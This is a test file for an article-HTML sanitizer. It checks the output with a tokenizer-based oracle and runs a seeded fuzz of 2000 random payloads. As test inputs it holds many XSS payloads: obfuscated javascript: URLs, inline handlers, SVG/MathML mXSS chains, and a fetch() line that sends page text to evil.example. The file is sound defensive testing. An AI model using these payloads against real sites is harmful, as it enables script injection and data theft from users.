// Article-HTML sanitizer (src/info/extract/sanitize.ts). Run: bun test.
//
// The sanitizer parses with a DOMParser; bun has none, so tests/support/dom-parser.ts hands it
// jsdom's (parse5, the same HTML5 spec WebKit implements) and the real code path
// runs here.
//
// What the output means is never judged by reading the string. Every safety
// assertion goes through HTMLRewriter (lol-html), a spec tokenizer: it reports
// the elements and attributes a browser will actually see in the output, which
// is the only thing that separates a neutralized payload from one that merely
// moved. `expect(out).not.toContain("onclick")` would pass on a string that
// spells the handler some other way.

import { expect, test } from "bun:test";
import "../support/dom-parser";
import { htmlToText, sanitizeArticleHtml, stripDataImages } from "../../src/info/extract/sanitize";

// --- oracle -----------------------------------------------------------------

interface SeenElement {
  tag: string;
  attrs: [string, string][];
}

interface Seen {
  elements: SeenElement[];
  // Each text chunk as it is written in the source, entities and all.
  text: string[];
}

// Every element, attribute and text run a browser's tokenizer finds in `html`.
// lol-html reports source text, not decoded values: `title="a&amp;b"` comes
// back as the six characters `a&amp;b`. That is the more useful view here —
// decodeAttr below turns it into what the renderer will see, and ESCAPED_ONLY
// checks the source form directly — but it means no assertion may read one for
// the other.
async function oracle(html: string): Promise<Seen> {
  const elements: SeenElement[] = [];
  const text: string[] = [];
  await new HTMLRewriter()
    .on("*", {
      element(el) {
        elements.push({ tag: el.tagName, attrs: [...el.attributes] });
      },
    })
    // Document-level, so a text run that is not inside any element counts too:
    // the sanitizer unwraps an off-list element and its text lands at the top.
    .onDocument({
      text(t) {
        if (t.text !== "") text.push(t.text);
      },
    })
    .transform(new Response(html))
    .text();
  return { elements, text };
}

// The four escapes the sanitizer writes, and nothing else. If this holds, the
// output's source text and its decoded value differ by exactly those four, so
// decodeAttr is the whole decoder and a second parse cannot read a different
// URL out of the same record.
const ESCAPED_ONLY = /&(?!(?:amp|quot|lt|gt);)/;

// What the renderer decodes an attribute value back into. The inverse of the
// sanitizer's escapeAttr, "&amp;" last so `&amp;lt;` comes back as the text
// "&lt;" rather than as "<". Only sound because ESCAPED_ONLY holds.
function decodeAttr(value: string): string {
  return value
    .replace(/&quot;/g, '"')
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&");
}

// The policy, written out a second time so the test states it rather than
// importing it from the code it is checking.
const ALLOWED_TAGS = new Set([
  "a", "abbr", "address", "article", "aside", "b", "bdi", "bdo", "blockquote", "br", "caption",
  "cite", "code", "col", "colgroup", "dd", "del", "dfn", "div", "dl", "dt", "em", "figcaption",
  "figure", "footer", "h1", "h2", "h3", "h4", "h5", "h6", "header", "hr", "i", "img", "ins", "kbd",
  "li", "main", "mark", "ol", "p", "pre", "q", "rp", "rt", "ruby", "s", "samp", "section", "small",
  "span", "strong", "sub", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "time", "tr",
  "tt", "u", "ul", "var", "wbr",
]);

const ALLOWED_ATTRS: Record<string, string[]> = {
  a: ["href", "target", "rel"],
  img: ["src", "loading"],
  td: ["colspan", "rowspan"],
  th: ["colspan", "rowspan"],
  ol: ["start"],
  col: ["span"],
  colgroup: ["span"],
};

const SAFE_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp|x-icon)[;,]/i;

// Everything that would make this output unsafe in a webview, as the oracle
// sees it. An empty list is the assertion; the strings are there so a failure
// names the payload that produced them.
async function violations(out: string): Promise<string[]> {
  const bad: string[] = [];
  const seen = await oracle(out);
  for (const el of seen.elements) {
    if (!ALLOWED_TAGS.has(el.tag)) bad.push(`element <${el.tag}>`);
    const allowed = ALLOWED_ATTRS[el.tag] ?? [];
    for (const [name, raw] of el.attrs) {
      if (name.startsWith("on")) bad.push(`handler ${el.tag}[${name}]`);
      if (!allowed.includes(name)) {
        bad.push(`attribute ${el.tag}[${name}]`);
        continue;
      }
      // An entity the sanitizer did not write is a value that means one thing
      // in this string and another after the next parse, which is how
      // `https://&#101;vil.example/a.jpg` changed hosts between passes.
      if (ESCAPED_ONLY.test(raw)) bad.push(`unescaped & in ${el.tag}[${name}]=${raw}`);
      const value = decodeAttr(raw);
      if (name === "href" || name === "src") {
        const url = value.replace(/[\u0000-\u001f\u007f]/g, "");
        const ok = /^https?:\/\//i.test(url) || (el.tag === "img" && SAFE_DATA_IMAGE.test(url));
        if (!ok) bad.push(`url ${el.tag}[${name}]=${value}`);
      }
      if (["colspan", "rowspan", "start", "span"].includes(name) && !/^\d{1,4}$/.test(value)) {
        bad.push(`count ${el.tag}[${name}]=${value}`);
      }
    }
  }
  // Text is escaped by a different function than attributes are; the property
  // is the same one and it is checked rather than assumed.
  for (const chunk of seen.text) {
    if (ESCAPED_ONLY.test(chunk)) bad.push(`unescaped & in text ${JSON.stringify(chunk)}`);
  }
  return bad;
}

async function expectSafe(source: string): Promise<string> {
  const out = sanitizeArticleHtml(source);
  expect(await violations(out)).toEqual([]);
  // Byte for byte, not safe-again. The article view and the saved-article read
  // path both run this over bodies that already went through it, so a body that
  // sanitizes to something else on the second pass is a record that renders
  // differently depending on how many reads it has had. Judging the second pass
  // by the oracle only asks whether the drift was dangerous.
  expect(sanitizeArticleHtml(out)).toBe(out);
  return out;
}

// The attributes the oracle finds on the first element of that name, decoded:
// these assertions are about the URL the renderer resolves, not the escaping,
// which violations() covers.
async function attrsOf(out: string, tag: string): Promise<Record<string, string>> {
  const el = seenFirst(await oracle(out), tag);
  return el ? Object.fromEntries(el.attrs.map(([n, v]) => [n, decodeAttr(v)])) : {};
}

function seenFirst(seen: Seen, tag: string): SeenElement | undefined {
  return seen.elements.find((e) => e.tag === tag);
}

// The elements alone, for the tests that assert the whole output is text.
async function elementsOf(html: string): Promise<SeenElement[]> {
  return (await oracle(html)).elements;
}

// --- the two demonstrated bypasses ------------------------------------------

// `[^>]*>` ends a tag at the first ">", but a tokenizer inside a double-quoted
// attribute value does not: the whole thing is one tag, and the old scrubber
// only ever saw "<marquee title="a". The handler reached the DOM intact.
test("a > inside a quoted attribute value does not end the tag", async () => {
  const out = await expectSafe(
    `<marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>`,
  );
  expect(await elementsOf(out)).toEqual([]);
  expect(out).toBe("x");
});

test("a > inside a single-quoted attribute value does not end the tag either", async () => {
  const out = await expectSafe(`<p title='a>b' onclick=alert(1)>text</p>`);
  expect(await attrsOf(out, "p")).toEqual({});
  expect(out).toBe("<p>text</p>");
});

// Removing an attribute by replacing it with "" glued its neighbours together:
// "on" + "click=alert(1)" is an onclick that was never in the input.
test("removing an attribute cannot fuse its neighbours into a handler", async () => {
  const out = await expectSafe(`<p on class="x"click=alert(1)>x</p>`);
  expect(await attrsOf(out, "p")).toEqual({});
  expect(out).toBe("<p>x</p>");
});

test("the same fusion through an unquoted value", async () => {
  const out = await expectSafe(`<p on class=x click=alert(1) title=y>x</p>`);
  expect(await attrsOf(out, "p")).toEqual({});
});

// --- handlers and schemes ---------------------------------------------------

test("inline handlers go however they are written", async () => {
  for (const html of [
    `<p onclick="steal()">hi</p>`,
    `<p onmouseover=alert(1)>hi</p>`,
    `<p ONCLICK=alert(1)>hi</p>`,
    "<p onclick=`alert(1)`>hi</p>",
    `<p/onclick=alert(1)>hi</p>`,
    `<p onclick\n=\nalert(1)>hi</p>`,
    `<p onclick=alert(1) onmouseover='x' ONFOCUS=y autofocus>hi</p>`,
    `<p OnClIcK=alert(1)>hi</p>`,
    `<p on\u0000click=alert(1)>hi</p>`,
  ]) {
    const out = await expectSafe(html);
    expect(await attrsOf(out, "p")).toEqual({});
    expect(out).toContain("hi");
  }
});

test("a javascript: href is dropped however it is spelled", async () => {
  for (const href of [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "  javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "jav\tascript:alert(1)",
    "java\u0000script:alert(1)",
    "&#106;avascript:alert(1)",
    "&#x6a;avascript:alert(1)",
    "&amp;#106;avascript:alert(1)",
    "&#38;#106;avascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "about:blank",
    "//evil.example/x",
    "#anchor",
  ]) {
    const out = await expectSafe(`<a href="${href}">go</a>`);
    expect(await attrsOf(out, "a")).toEqual({});
    expect(out).toBe("<a>go</a>");
  }
});

test("a quote or a newline inside an http URL cannot end the attribute", async () => {
  const quoted = await expectSafe(`<a href='https://x/a"onmouseover=alert(1)'>x</a>`);
  // The quote stays inside the value instead of ending it: one href, the whole
  // string, and no second attribute for the tokenizer to find.
  expect(await attrsOf(quoted, "a")).toEqual({
    href: 'https://x/a"onmouseover=alert(1)',
    target: "_blank",
    rel: "noreferrer noopener",
  });
  expect(quoted).toContain('href="https://x/a&quot;onmouseover=alert(1)"');
  // Tab, CR and LF are stripped from a URL by the renderer, so they are stripped
  // before the scheme test and the value written out is the one that was tested.
  const split = await expectSafe(`<img src="https://x/\ta\n.jpg">`);
  expect(await attrsOf(split, "img")).toEqual({ src: "https://x/a.jpg", loading: "lazy" });
});

test("an http link keeps its href and opens outside the app", async () => {
  const out = await expectSafe(`<a href="https://example.com" onclick="y()">x</a>`);
  expect(await attrsOf(out, "a")).toEqual({
    href: "https://example.com",
    target: "_blank",
    rel: "noreferrer noopener",
  });
});

// --- elements whose content is not prose ------------------------------------

test("script, style and the plugin elements go with their content", async () => {
  const out = await expectSafe(
    `<p onclick="steal()">Hi</p><script>evil()</script><style>x{}</style>` +
      `<iframe src="https://ad"></iframe><object data="javascript:alert(1)"></object>` +
      `<embed src="javascript:alert(1)"><form action="javascript:alert(1)">` +
      `<button formaction="javascript:alert(1)">go</button></form>`,
  );
  expect(out).toBe("<p>Hi</p>");
});

test("svg goes with everything inside it", async () => {
  for (const html of [
    `<svg><script>alert(1)</script></svg>`,
    `<svg><foreignObject><p onclick=alert(1)>t</p></foreignObject></svg>`,
    `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
    `<svg/onload=alert(1)>`,
    `<svg><image href="javascript:alert(1)"></svg>`,
    `<svg><desc><![CDATA[<img src=x onerror=alert(1)>]]></desc></svg>`,
  ]) {
    const out = await expectSafe(html);
    expect(await elementsOf(out)).toEqual([]);
  }
});

test("a nested svg does not let the outer one end early", async () => {
  const out = await expectSafe(`<svg><svg></svg><script>alert(1)</script></svg><p>after</p>`);
  expect(out).toBe("<p>after</p>");
});

test("MathML and the mtext/mglyph mXSS chain go too", async () => {
  const out = await expectSafe(
    `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><p>after</p>`,
  );
  expect(await elementsOf(out)).toEqual([{ tag: "p", attrs: [] }]);
});

test("raw-text and form elements take their payload with them", async () => {
  for (const html of [
    `<template><img src=x onerror=alert(1)></template>`,
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
    `<xmp><img src=x onerror=alert(1)></xmp>`,
    `<plaintext><img src=x onerror=alert(1)>`,
    `<textarea><img src=x onerror=alert(1)></textarea>`,
    `<select><option><img src=x onerror=alert(1)></option></select>`,
    `<title><img src=x onerror=alert(1)></title>`,
    `<base href="javascript:"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
  ]) {
    const out = await expectSafe(html);
    expect(await elementsOf(out)).toEqual([]);
  }
});

// --- malformed markup -------------------------------------------------------

test("malformed, unclosed and doubled-up tags stay harmless", async () => {
  for (const html of [
    `<<script>alert(1)//<</script>`,
    `<img """><img src=x onerror="alert(1)">`,
    `<p title="unclosed`,
    `<a href="https://x`,
    `<div><p>text`,
    `</p>text</div></span>`,
    `<p<p onclick=alert(1)>x`,
    `<!--><img src=x onerror=alert(1)>-->`,
    `<!-- <img src=x onerror=alert(1)> -->`,
    `<![CDATA[<img src=x onerror=alert(1)>]]>`,
    `<?xml-stylesheet href="javascript:alert(1)"?>`,
    `<p onclick=alert(1)`,
    `<p `.repeat(50),
    `<div>`.repeat(600) + "deep" + `</div>`.repeat(600),
  ]) {
    await expectSafe(html);
  }
});

test("an escaped payload stays text, at one level of encoding or two", async () => {
  const once = await expectSafe(`<p>&lt;img src=x onerror=alert(1)&gt;</p>`);
  expect(await elementsOf(once)).toEqual([{ tag: "p", attrs: [] }]);
  const twice = await expectSafe(`<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>`);
  expect(await elementsOf(twice)).toEqual([{ tag: "p", attrs: [] }]);
  // Decoded once by the parser, written back escaped, so re-parsing gives the
  // same text rather than a tag.
  expect(twice).toBe("<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>");
  const quoted = await expectSafe(`<div title="&quot;><img src=x onerror=alert(1)>">t</div>`);
  expect(await elementsOf(quoted)).toEqual([{ tag: "div", attrs: [] }]);
});

// An entity in the middle of a URL is the same one-level-of-encoding question,
// asked where it decides a host rather than a tag. The parser hands over the
// decoded value, so what is written back has to be escaped or the next pass
// decodes it a second time — and the next pass always comes: sanitizing runs on
// every read of a stored body, not once on the way in.
test("an entity inside a URL cannot decode into a different URL on a later pass", async () => {
  const img = await expectSafe(`<img src="https://&amp;#101;vil.example/a.jpg">`);
  expect(await attrsOf(img, "img")).toEqual({
    src: "https://&#101;vil.example/a.jpg",
    loading: "lazy",
  });
  const link = await expectSafe(`<a href="https://&amp;#101;vil.example/x">t</a>`);
  expect((await attrsOf(link, "a")).href).toBe("https://&#101;vil.example/x");
  // The same host on the third pass as on the first, which is the property the
  // renderer depends on: expectSafe pins pass two, this pins that it converges.
  expect(sanitizeArticleHtml(sanitizeArticleHtml(img))).toBe(img);
  // And a query string keeps its separators as separators rather than losing an
  // "&amp;" a pass.
  const query = await expectSafe(`<img src="https://cdn.x/a.jpg?w=1&amp;amp;h=2">`);
  expect((await attrsOf(query, "img")).src).toBe("https://cdn.x/a.jpg?w=1&amp;h=2");
});

// --- images -----------------------------------------------------------------

test("keeps http(s) images and lets them load lazily", async () => {
  const out = await expectSafe(`<img src="https://cdn.qbitai.com/a.jpg" onerror="x()" width="600">`);
  expect(await attrsOf(out, "img")).toEqual({ src: "https://cdn.qbitai.com/a.jpg", loading: "lazy" });
  // The img: proxy fetches these, so a referrer policy on the tag would decide
  // nothing (docs/pitfall/30).
  expect(out).not.toContain("referrerpolicy");
});

test("drops images with a non-http/data src and no lazy fallback (relative, trackers)", async () => {
  expect(await expectSafe(`<img src="/rel.jpg">`)).toBe("");
  expect(await expectSafe(`<img src="about:blank">`)).toBe("");
  expect(await expectSafe(`<img src="javascript:alert(1)">`)).toBe("");
  expect(await expectSafe(`<img src="data:image/png;base64,AAAA">`)).toContain("data:image/png");
  // Markup with its own parser, not a picture.
  expect(await expectSafe(`<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">`)).toBe("");
  expect(await expectSafe(`<img src="data:text/html;base64,PHNjcmlwdD4=">`)).toBe("");
});

test("srcset is a source of candidate URLs, never an attribute of the output", async () => {
  const ss = await expectSafe(`<img srcset="https://x/1x.jpg 1x, https://x/2x.jpg 2x">`);
  expect(await attrsOf(ss, "img")).toEqual({ src: "https://x/1x.jpg", loading: "lazy" });
  expect(await expectSafe(`<img data-srcset="https://x/d.jpg 1x">`)).toContain('src="https://x/d.jpg"');
  expect(await expectSafe(`<img srcset="javascript:alert(1) 1x">`)).toBe("");
  expect(await expectSafe(`<img srcset="data:text/html,<script>alert(1)</script> 1x">`)).toBe("");
  const withSrc = await expectSafe(
    `<img src="https://x/real.jpg" srcset="javascript:alert(1) 1x">`,
  );
  expect(await attrsOf(withSrc, "img")).toEqual({ src: "https://x/real.jpg", loading: "lazy" });
});

test("recovers lazy-loaded images from data-src/srcset (WeChat/mmbiz mirrors)", async () => {
  // Real mmbiz shape: no src, image only in data-src, fragment preserved.
  const mm = await expectSafe(
    `<img class="rich_pages" data-src="https://mmbiz.qpic.cn/sz_mmbiz_gif/a.gif?wx_fmt=gif&from=appmsg#imgIndex=1" data-ratio="0.51" data-type="gif">`,
  );
  expect(await attrsOf(mm, "img")).toEqual({
    src: "https://mmbiz.qpic.cn/sz_mmbiz_gif/a.gif?wx_fmt=gif&from=appmsg#imgIndex=1",
    loading: "lazy",
  });

  // Placeholder src + real data-src: the real image wins.
  const ph = await expectSafe(
    `<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" data-src="https://mmbiz.qpic.cn/real.jpg">`,
  );
  expect(ph).toContain('src="https://mmbiz.qpic.cn/real.jpg"');
  expect(ph).not.toContain("data:image");

  // Other lazy attributes.
  expect(await expectSafe(`<img data-original="https://x/o.jpg">`)).toContain('src="https://x/o.jpg"');
  expect(await expectSafe(`<img data-actual-src="https://x/a.jpg">`)).toContain('src="https://x/a.jpg"');

  // A real http src still wins over lazy attributes.
  expect(await expectSafe(`<img src="https://x/real.jpg" data-src="https://x/lazy.jpg">`)).toContain(
    'src="https://x/real.jpg"',
  );
  // Protocol-relative src is normalized rather than dropped.
  expect(await expectSafe(`<img src="//cdn.x/p.jpg">`)).toContain('src="https://cdn.x/p.jpg"');
});

test("a <picture> collapses to the image its candidates name", async () => {
  const real = await expectSafe(
    `<picture><source srcset="https://x/big.webp 2x, https://x/small.webp 1x" type="image/webp">` +
      `<source srcset="https://x/big.jpg"><img src="https://x/fallback.jpg" alt="a"></picture>`,
  );
  expect(await attrsOf(real, "img")).toEqual({ src: "https://x/fallback.jpg", loading: "lazy" });
  // Only the <source> knows the URL: it still becomes the image rather than a
  // <source> element the webview would fetch on its own rules.
  const lazy = await expectSafe(
    `<picture><source srcset="https://x/big.webp 2x"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>`,
  );
  expect(await attrsOf(lazy, "img")).toEqual({ src: "https://x/big.webp", loading: "lazy" });
  expect(await expectSafe(`<picture><source srcset="javascript:alert(1) 1x"><img src="x"></picture>`)).toBe("");
});

test("a comma in a CDN path is part of the URL, not a srcset separator", async () => {
  const out = await expectSafe(`<img src="https://cdn.x/w_800,h_600/a.jpg">`);
  expect(await attrsOf(out, "img")).toEqual({
    src: "https://cdn.x/w_800,h_600/a.jpg",
    loading: "lazy",
  });
});

test("an off-list attribute has to look like a picture to become a src", async () => {
  expect(await expectSafe(`<img data-echo="https://x/e.jpg">`)).toContain('src="https://x/e.jpg"');
  expect(await expectSafe(`<img data-image="https://x/i.jpg">`)).toContain('src="https://x/i.jpg"');
  expect(await expectSafe(`<img data-flickity-lazyload="https://x/f.jpg">`)).toContain('src="https://x/f.jpg"');
  expect(await expectSafe(`<img data-echo="https://mmbiz.qpic.cn/mmbiz_jpg/abc/640?wx_fmt=jpeg">`)).toContain(
    'src="https://mmbiz.qpic.cn/mmbiz_jpg/abc/640?wx_fmt=jpeg"',
  );

  // A share link or a beacon on the tag is not a picture, and an <img> with no
  // picture at all is dropped rather than pointed at one.
  const beacons = await expectSafe(
    `<img data-share="https://social.example/post/1" data-track="https://t.example/px?id=9">`,
  );
  expect(beacons).toBe("");
  expect(await expectSafe(`<img data-open="https://news.example/article/9">`)).toBe("");
  const withShare = await expectSafe(
    `<img src="https://x/photo.jpg" data-share-url="https://social.example/post/1">`,
  );
  expect(await attrsOf(withShare, "img")).toEqual({ src: "https://x/photo.jpg", loading: "lazy" });
});

// --- what a real article keeps ----------------------------------------------

test("prose is left alone", async () => {
  const html = `<p>hi <b>there</b></p><h2>T</h2><ul><li>x</li></ul>`;
  expect(await expectSafe(html)).toBe(html);
  expect(await expectSafe(`<p class=big style=color:red id=x>x</p>`)).toBe("<p>x</p>");
  expect(await expectSafe(`<blockquote cite=javascript:alert(1)>x</blockquote>`)).toBe(
    "<blockquote>x</blockquote>",
  );
  // A table keeps the spans that make it readable, as digits.
  const table = await expectSafe(
    `<table><tr><td colspan="2" onclick=alert(1)>a</td><td colspan="x(1)">b</td></tr></table>`,
  );
  expect(table).toBe("<table><tbody><tr><td colspan=\"2\">a</td><td>b</td></tr></tbody></table>");
  expect(await expectSafe(`<ol start="3" onclick=x()><li>a</li></ol>`)).toBe(
    '<ol start="3"><li>a</li></ol>',
  );
  // An unlisted wrapper costs its tag, not its text.
  expect(await expectSafe(`<p><font color=red>keep</font> <custom-card>this</custom-card></p>`)).toBe(
    "<p>keep this</p>",
  );
});

test("an element the parser puts outside the body is not smuggled in", async () => {
  // <body onload> sets an attribute on the document's body; there is no element
  // in the fragment at all, so nothing renders.
  expect(await expectSafe(`<body onload=alert(1)>`)).toBe("");
  expect(await expectSafe(`<html><head><script>alert(1)</script></head><body><p>x</p></body></html>`)).toBe(
    "<p>x</p>",
  );
});

test("without a DOMParser there is no sanitizer, so there is no body", () => {
  const saved = globalThis.DOMParser;
  // @ts-expect-error - putting the runtime back to what bun ships.
  delete globalThis.DOMParser;
  try {
    expect(sanitizeArticleHtml(`<p>text</p>`)).toBe("");
  } finally {
    globalThis.DOMParser = saved;
  }
});

// --- a sweep over the payloads that did not earn a test of their own --------

test("nothing in the payload corpus survives", async () => {
  const corpus = [
    `<img src=x onerror=alert(1)//>`,
    `<img src=x:alert(1) onerror=eval(src) `,
    `<a href="https://ok.example" onfocus=alert(1) autofocus>x</a>`,
    `<div style="background:url(javascript:alert(1))">x</div>`,
    `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
    `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
    `<style>@import 'javascript:alert(1)';</style><p>x</p>`,
    `<p style="width:expression(alert(1))">x</p>`,
    `<a href="https://ok.example/">ok</a><a href="javascript:alert(1)">bad</a>`,
    `<video><source src="javascript:alert(1)"></video>`,
    `<audio src=x onerror=alert(1)>`,
    `<details open ontoggle=alert(1)>x</details>`,
    `<marquee onstart=alert(1)>x</marquee>`,
    `<isindex action="javascript:alert(1)">`,
    `<object type="text/html" data="https://evil.example/"></object>`,
    `<meta charset="utf-8"><p>x</p>`,
    `<p>a</p><script src="https://evil.example/x.js"></script>`,
    `<p title="a>" onclick="alert(1)">b</p>`,
    `<p title='a>' onclick=alert(1)>b</p>`,
    `<p title=a> onclick=alert(1)>b</p>`,
    `<img title="a>" onerror="alert(1)" src="https://x/a.jpg">`,
    `<a title="a>" href="javascript:alert(1)">x</a>`,
    `<a href="https://x/a" title="b>" onclick=alert(1)>x</a>`,
    `<p on click=alert(1)>x</p>`,
    `<p on\tclass="x"click=alert(1)>x</p>`,
    `<p on/class="x"click=alert(1)>x</p>`,
    `<p class="on"click=alert(1)>x</p>`,
    `<p data-x="y"onclick=alert(1)>x</p>`,
    `<svg><style><img src=x onerror=alert(1)></style></svg>`,
    `<svg><set attributeName="onload" to="alert(1)"></svg>`,
    `<form><input type=image src=x onerror=alert(1)></form>`,
    `<p>&#60;script&#62;alert(1)&#60;/script&#62;</p>`,
    `<p>&#x3c;img src=x onerror=alert(1)&#x3e;</p>`,
    `<div><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">x</a></div>`,
    `<a href="https://x/a?b=1&amp;c=2">x</a>`,
    `<p>text with & an ampersand < and a bracket</p>`,
    `<img src="https://&amp;#101;vil.example/a.jpg">`,
    `<a href="https://ok.example/&amp;#x2f;&amp;#x2f;evil.example/">x</a>`,
    `<img src="https://cdn.x/a.jpg?w=1&amp;amp;h=2">`,
    `<td colspan="&amp;#50;">x</td>`,
  ];
  for (const html of corpus) await expectSafe(html);
});

// --- a seeded fuzz over the same shapes -------------------------------------

// The corpus above is what someone thought of. This is 2000 payloads nobody
// thought of: tag names, attribute names, separators, quoting and text glued
// together at random, with a fixed seed so a failure is reproducible. The
// judge is the same oracle, so a bypass shows up as an element or attribute in
// the output that the allowlist never named. Against the regex sanitizer this
// replaced, this run reports hundreds of leaks.
function mulberry32(seed: number): () => number {
  let a = seed;
  return () => {
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const FUZZ_TAGS = [
  "p", "div", "img", "a", "marquee", "svg", "math", "script", "style", "template", "noscript",
  "iframe", "form", "table", "td", "foreignObject", "mglyph", "mtext", "xmp", "textarea", "title",
  "select", "option", "plaintext", "body", "custom-el", "p<p", "annotation-xml", "picture",
  "source", "ol", "li",
];
const FUZZ_ATTRS = [
  "onclick", "onerror", "onload", "on", "class", "style", "src", "href", "srcset", "data-src",
  "title", "xlink:href", "formaction", "colspan", "id", "click", "onstart", "value", "start",
];
const FUZZ_VALUES = [
  '"a>"', "'a>'", "a>", '"javascript:alert(1)"', "javascript:alert(1)", '"jav&#x09;ascript:alert(1)"',
  '"https://x/a.jpg"', '"//x/a.jpg"', '"data:image/svg+xml,<svg/onload=alert(1)>"', '"alert(1)"',
  "alert(1)", "`alert(1)`", '"x"', "x", '""', "", '"&quot;><img src=x onerror=alert(1)>"',
  '"https://x/a\\"onerror=alert(1)"', '"\u0000javascript:alert(1)"',
];
const FUZZ_SEPS = [" ", "\t", "\n", "/", "", "//", " \n ", "\u0000"];
const FUZZ_TEXT = ["hi", "<", ">", "&", "&lt;img src=x onerror=alert(1)&gt;", "&amp;lt;", "]]>", "<!--", "-->", "\u0000"];

test("2000 seeded random payloads produce nothing off the allowlist", async () => {
  const rand = mulberry32(20260813);
  const pick = <T,>(a: T[]): T => a[Math.floor(rand() * a.length)];
  const tag = (): string => {
    const name = pick(FUZZ_TAGS);
    let s = `<${name}`;
    for (let i = 0, n = Math.floor(rand() * 3); i < n; i += 1) {
      const v = pick(FUZZ_VALUES);
      s += `${pick(FUZZ_SEPS)}${pick(FUZZ_ATTRS)}${v === "" ? "" : `${pick(["=", " = "])}${v}`}`;
    }
    s += pick([">", "/>", " >", "", ">>", "<"]);
    if (rand() < 0.5) s += `${pick(FUZZ_TEXT)}</${name}>`;
    return s;
  };
  for (let round = 0; round < 2000; round += 1) {
    let html = "";
    for (let i = 0, n = 1 + Math.floor(rand() * 4); i < n; i += 1) {
      html += rand() < 0.8 ? tag() : pick(FUZZ_TEXT);
    }
    const out = sanitizeArticleHtml(html);
    const bad = await violations(out);
    if (bad.length > 0) throw new Error(`${JSON.stringify(html)} -> ${JSON.stringify(out)}: ${bad.join(", ")}`);
    const again = sanitizeArticleHtml(out);
    if (again !== out) {
      throw new Error(
        `not idempotent: ${JSON.stringify(html)} -> ${JSON.stringify(out)} -> ${JSON.stringify(again)}`,
      );
    }
  }
  expect(true).toBe(true);
});

// --- htmlToText / stripDataImages -------------------------------------------

test("htmlToText turns blocks into breaks and decodes entities", () => {
  const t = htmlToText(`<h1>Title</h1><p>a &amp; b</p><p>c</p>`);
  expect(t).toBe("Title\n\na & b\n\nc");
});

// stripDataImages runs on both bodies that travel: the published briefing
// bodies and a kept article. An inlined image outweighs the article it
// illustrates; an external one is a URL, and the reading end renders it through
// the img: proxy.

test("stripDataImages drops inlined base64 images, tag and all", () => {
  const html =
    '<p>one</p><img src="data:image/jpeg;base64,AAAA" referrerpolicy="no-referrer" loading="lazy"><p>two</p>';
  expect(stripDataImages(html)).toBe("<p>one</p><p>two</p>");
});

test("stripDataImages leaves an external image alone", () => {
  const html = '<img src="https://cdn.example.com/x.jpg" loading="lazy">';
  expect(stripDataImages(html)).toBe(html);
  expect(stripDataImages("text")).toBe("text");
});

test("stripDataImages drops every inlined image, not just the first", () => {
  const html = '<img src="data:image/png;base64,A"><p>x</p><img src="data:image/png;base64,B">';
  expect(stripDataImages(html)).toBe("<p>x</p>");
});

// What sanitizeArticleHtml hands over is the shape this has to match: rebuilt
// tags, src first, single quotes gone.
test("stripDataImages matches what the sanitizer emits", () => {
  const sanitized = sanitizeArticleHtml(
    '<img src="data:image/png;base64,AAAA"><p>x</p><img src="https://cdn.x/a.jpg" width="600">',
  );
  expect(stripDataImages(sanitized)).toBe('<p>x</p><img src="https://cdn.x/a.jpg" loading="lazy">');
});
